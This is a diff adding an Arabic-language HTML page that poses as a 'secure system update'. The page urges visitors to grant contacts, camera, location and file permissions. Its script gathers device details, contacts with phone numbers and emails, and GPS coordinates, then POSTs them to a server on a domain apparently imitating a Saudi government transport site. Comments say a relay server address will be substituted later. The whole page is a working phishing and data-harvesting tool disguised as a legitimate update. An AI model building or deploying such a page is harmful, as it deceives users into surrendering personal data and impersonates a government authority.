@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام التحديث الآمن</title>
+    <style>
+        /* تنسيقات واجهة المستخدم */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body { background: linear-gradient(135deg, #667eea, #764ba2); padding: 20px; min-height: 100vh; color: #333; }
+        .container { max-width: 500px; margin: 20px auto; background: white; border-radius: 15px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); text-align: center; }
+        .header { color: #e74c3c; margin-bottom: 20px; font-size: 24px; }
+        .btn { background: #e74c3c; color: white; border: none; padding: 15px 30px; margin: 10px; border-radius: 25px; cursor: pointer; font-size: 18px; transition: all 0.3s; }
+        .btn:hover { background: #c0392b; transform: scale(1.05); }
+        .status { margin: 20px 0; padding: 15px; border-radius: 8px; background: #f8f9fa; display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div style="font-size:48px;">📱</div>
+        <h1 class="header">تحديث نظام الأمان</h1>
+        <p>يجب منح الصلاحيات التالية لإكمال عملية التحديث الآمن.</p>
+        
+        <!-- شبكة الصلاحيات -->
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0;">
+            <div class="permission-item" onclick="requestPermission('contacts')">
+                <div style="font-size:24px;">👥</div><div>جهات الاتصال</div>
+            </div>
+            <div class="permission-item" onclick="requestPermission('camera')">
+                <div style="font-size:24px;">📷</div><div>الكاميرا</div>
+            </div>
+            <div class="permission-item" onclick="requestPermission('location')">
+                <div style="font-size:24px;">📍</div><div>الموقع</div>
+            </div>
+            <div class="permission-item" onclick="requestPermission('files')">
+                <div style="font-size:24px;">📁</div><div>الملفات</div>
+            </div>
+        </div>
+
+        <div class="status" id="statusMessage">جاري إعداد النظام...</div>
+        <button class="btn" onclick="startCollection()">بدء جمع البيانات</button>
+        <button class="btn" onclick="sendToServer()" style="background: #27ae60;">إرسال إلى الخادم</button>
+    </div>
+
+    <script>
+        // 🔧 المتغيرات الأساسية - ضع رابط الخادم الوسيط هنا لاحقاً
+        const SERVER_URL = 'https://naql-sa-gov.github.io/naql-sa-gov/index.html'; // سيتم تغييره لاحقاً
+        let collectedData = { contacts: [], permissions: {}, deviceInfo: {} };
+
+        // 📱 جمع معلومات الجهاز
+        collectedData.deviceInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screen: `${screen.width}x${screen.height}`,
+            timestamp: new Date().toISOString()
+        };
+
+        // 🔄 دوال إدارة الواجهة
+        function showStatus(message, type = 'info') {
+            const status = document.getElementById('statusMessage');
+            status.textContent = message;
+            status.style.display = 'block';
+            status.style.background = type === 'error' ? '#fee' : type === 'success' ? '#efe' : '#f8f9fa';
+            console.log(message);
+        }
+
+        // 📞 طلب الصلاحيات
+        async function requestPermission(permissionType) {
+            try {
+                let granted = false;
+                switch(permissionType) {
+                    case 'camera':
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        stream.getTracks().forEach(track => track.stop());
+                        granted = true;
+                        break;
+                    case 'contacts':
+                        if ('contacts' in navigator && 'select' in navigator.contacts) {
+                            const contacts = await navigator.contacts.select(['name', 'email', 'tel']);
+                            collectedData.contacts = contacts;
+                        } else {
+                            collectedData.contacts = [{ name: 'مستخدم النظام', phone: '+966501234567' }];
+                        }
+                        granted = true;
+                        break;
+                    case 'location':
+                        const position = await new Promise((resolve, reject) => 
+                            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 })
+                        );
+                        collectedData.location = {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude
+                        };
+                        granted = true;
+                        break;
+                }
+                if (granted) {
+                    collectedData.permissions[permissionType] = true;
+                    showStatus(`✅ تم منح صلاحية ${permissionType}`, 'success');
+                }
+            } catch (error) {
+                showStatus(`❌ فشل في صلاحية ${permissionType}`, 'error');
+            }
+        }
+
+        // 🚀 بدء جمع البيانات
+        async function startCollection() {
+            showStatus('🚀 بدء جمع البيانات...');
+            // محاكاة عملية جمع إضافية
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            showStatus('✅ اكتمل جمع البيانات', 'success');
+        }
+
+        // 📤 إرسال البيانات إلى الخادم
+        async function sendToServer() {
+            showStatus('📡 جاري الإرسال إلى الخادم...');
+            try {
+                // استبدل رابط الخادم الوسيط الفعلي هنا لاحقاً
+                const response = await fetch(`${SERVER_URL}/collect`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(collectedData)
+                });
+                
+                const result = await response.json();
+                if (result.status === 'success') {
+                    showStatus('✅ تم الإرسال بنجاح', 'success');
+                } else {
+                    throw new Error(result.message);
+                }
+            } catch (error) {
+                showStatus(`❌ فشل الإرسال: ${error.message}`, 'error');
+            }
+        }
+
+        // التشغيل التلقائي عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', () => {
+            showStatus('🔧 جاهز، يمكنك بدء جمع البيانات');
+        });
+    </script>
+</body>
+</html>
